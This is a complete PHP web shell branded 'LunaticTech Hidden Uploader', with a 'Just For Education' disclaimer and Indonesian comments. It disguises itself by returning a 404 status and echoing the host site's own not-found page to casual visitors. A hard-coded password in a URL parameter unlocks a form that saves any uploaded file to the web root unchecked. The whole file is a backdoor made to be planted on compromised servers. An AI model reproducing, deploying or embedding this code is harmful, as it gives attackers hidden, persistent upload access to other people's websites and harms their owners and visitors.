<?php 


/*
| LunaticTech Uploader V.1.3 
| With 404 Page
| Greetz Thx to ICWR TEAM , Afrizal F.A
| Gunakan Dengan Bijak Ya Tong :V

==========================================

| Just For Education :) 
| Don't Forget To Visit Our Site
| Lunatictech.xyz & icwr-tech.id

*/
error_reporting(null);
session_start();
header('HTTP/1.0 404 Not Found', true, 404);
http_response_code(404);
$pw = "lunatictech";
function upload(){
    if(isset($_POST['btn']))
{
    $nama= $_FILES['wos']['name'];
    $lokasi = $_FILES['wos']['tmp_name'];
    $folder="";
    if(move_uploaded_file($lokasi,$folder.$nama))
    {
echo'berhasil upload file :)';  }else{
        echo'gagal upload file :';
    }
}
echo'
<center><h3>LunaticTech Hidden Uploader </h3> </center>
<fieldset><legend> Upload Here ;</legend>
<form action="" method="post" enctype="multipart/form-data">
<input type="file" name="wos">
<button type="submit" name="btn" id="btn">upload !</button>
</form><a href="?logout">Logout !!!</a></div>
</fieldset>

';

}
function logshell(){
    if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off') { $protocol = 'https://'; }
$random = mt_rand(13224,3243434);
$url = "$protocol".$_SERVER['HTTP_HOST']."/".$random;
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
$login = curl_exec($ch);

curl_close($ch);


$reples = str_replace("/".$random,$_SERVER['SCRIPT_NAME'],$login);
echo $reples;
}

if($_GET['pw'] == $pw){    
    $_SESSION['pw'] = $pw;
upload();

} elseif($_SESSION['pw'] == $pw){
upload();
} else {
    logshell();
}

if(isset($_REQUEST['logout'])){
    session_destroy();

}

?>
